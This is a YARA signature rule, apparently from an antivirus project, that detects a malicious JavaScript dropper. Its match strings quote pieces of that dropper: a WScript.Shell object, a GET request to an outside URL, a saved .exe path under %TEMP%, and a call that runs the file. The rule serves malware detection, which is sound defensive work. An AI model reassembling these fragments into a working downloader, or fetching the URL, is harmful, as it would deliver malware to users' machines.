rule sig_20160328_7368def477dfc2799001af7db501ecc9 {
  meta:
    description = "datamaliciousorder - file 20160328_7368def477dfc2799001af7db501ecc9.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "5fe3421317e9e5fc4305719de495c7fae731315f7a3cab6645f27b45fee4b138"

  strings:
    $s1  = "function Rapskwgj() {return Qixdcopnzg[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"bDp87nTO9iL.exe\";};" fullword ascii
    $s2  = "do {WScript[Mbdjqms](Wuwesqz() * 11)} while (Fyyrwr[\"readystate\"] < 4 );" fullword ascii
    $s3  = "function Squreb(Ubxel, Iguffulzu){return Ubxel - Iguffulzu;};" fullword ascii
    $s4  = "var Qixdcopnzg = function Zuxznrm() {return WScript[Rjwdwli](\"WScript.Shell\");}();" fullword ascii
    $s5  = "Fyyrwr[Fiufbyxkw](\"GET\", \"http://chibitesafaris.co.tz/ke7sif\", false);" fullword ascii
    $s6  = "function Lpzikyz(Ueorzfsnj){Qixdcopnzg[\"Run\"](Ueorzfsnj, Ebcxgan, Ebcxgan);};" fullword ascii
    $s7  = "function Fogds() {return ((Crepga == true) && (Crepga == Mctfsi)) ? 1 : Ebcxgan;};" fullword ascii
    $s8  = "function Ybfktbqsz(Mqwmubz) {var Dviytbo = (1, 2, 3, 4, 5, Mqwmubz); return Dviytbo;};" fullword ascii
    $s9  = "function Qwvnd()" fullword ascii
    $s10 = "function Offzm(){return Rjwdwli;};" fullword ascii
    $s11 = "return Squreb(Ngjmjww, Smusuvn);" fullword ascii
    $s12 = "Crepga = true; " fullword ascii
    $s13 = "var Axqektxc = false;" fullword ascii
    $s14 = "var Nzgqruwyn = new this[\"Date\"]();" fullword ascii
    $s15 = " while (Dasgnjblj){" fullword ascii
    $s16 = "function Ixantqp(){return Nlyxwhlig;};" fullword ascii
    $s17 = "function Wuwesqz(){return 22;};" fullword ascii
    $s18 = "var Crepga = false;" fullword ascii
    $s19 = "var Mctfsi = false;" fullword ascii
    $s20 = "Mctfsi = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}